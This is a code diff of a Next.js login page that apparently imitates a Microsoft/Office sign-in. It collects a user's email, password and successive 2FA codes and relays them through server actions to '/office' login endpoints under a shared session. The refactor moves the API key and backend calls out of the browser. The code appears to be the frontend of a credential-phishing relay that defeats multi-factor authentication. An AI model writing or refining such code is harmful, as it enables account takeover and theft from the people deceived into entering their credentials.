@@ -4,11 +4,9 @@ import { useState } from "react";
 import styles from "./page.module.css";
 import Image from "next/image";
 
-type LoginStep = "email" | "password" | "2fa" | "success";
+import { initiateLogin, submit2FA, submitPassword } from "./actions";
 
-const API_BASE_URL =
-  process.env.NEXT_PUBLIC_API_BASE_URL || "http://localhost:8000/api";
-const API_KEY = process.env.NEXT_PUBLIC_API_KEY || "";
+type LoginStep = "email" | "password" | "2fa" | "success";
 
 export default function Home() {
   const [step, setStep] = useState<LoginStep>("email");
@@ -30,18 +28,9 @@ export default function Home() {
     setError(null);
 
     try {
-      const response = await fetch(`${API_BASE_URL}/office/login/initiate`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "X-API-Key": API_KEY,
-        },
-        body: JSON.stringify({ email }),
-      });
+      const { success, data, message } = await initiateLogin({ email });
 
-      const data = await response.json();
-
-      if (data.success) {
+      if (success && data.success) {
         setSessionId(data.sessionId);
         if (data.status === "REQUIRES_PASSWORD") {
           setStep("password");
@@ -52,7 +41,7 @@ export default function Home() {
           setStep("password");
         }
       } else {
-        setError(data.message || "Failed to initiate login");
+        setError(message || data?.message || "Failed to initiate login");
       }
     } catch (err) {
       setError("An error occurred. Please try again.");
@@ -70,18 +59,9 @@ export default function Home() {
     setError(null);
 
     try {
-      const response = await fetch(`${API_BASE_URL}/office/login/password`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "X-API-Key": API_KEY,
-        },
-        body: JSON.stringify({ sessionId, password }),
-      });
+      const { success, data, message } = await submitPassword({ sessionId, password });
 
-      const data = await response.json();
-
-      if (data.success) {
+      if (success && data.success) {
         if (data.challengeType) {
           setChallengeType(data.challengeType);
           setChallengeMetadata(data.challengeMetadata || null);
@@ -96,12 +76,12 @@ export default function Home() {
         }
       } else {
         // Check for 2FA even if success is false but data contains challenge
-        if (data.challengeType) {
+        if (data?.challengeType) {
           setChallengeType(data.challengeType);
           setChallengeMetadata(data.challengeMetadata || null);
           setStep("2fa");
         } else {
-          setError(data.message || "Invalid password or login failed");
+          setError(message || data?.message || "Invalid password or login failed");
           setPassword(""); // Clear password on error as Microsoft usually does
         }
       }
@@ -125,28 +105,19 @@ export default function Home() {
     setError(null);
 
     try {
-      const response = await fetch(`${API_BASE_URL}/office/2fa`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "X-API-Key": API_KEY,
-        },
-        body: JSON.stringify({ sessionId, code: twoFACode }),
-      });
+      const { success, data, message } = await submit2FA({ sessionId, code: twoFACode });
 
-      const data = await response.json();
-
-      if (data.success) {
+      if (success && data.success) {
         setStep("success");
       } else {
         // Handle multi-step verification (EMAIL_ADDRESS -> EMAIL_OTP)
-        if (data.challengeType) {
+        if (data?.challengeType) {
           setChallengeType(data.challengeType);
           setChallengeMetadata(data.challengeMetadata || null);
           setTwoFACode("");
           if (data.message) setError(data.message);
         } else {
-          setError(data.message || "Invalid code");
+          setError(message || data?.message || "Invalid code");
         }
       }
     } catch (err) {
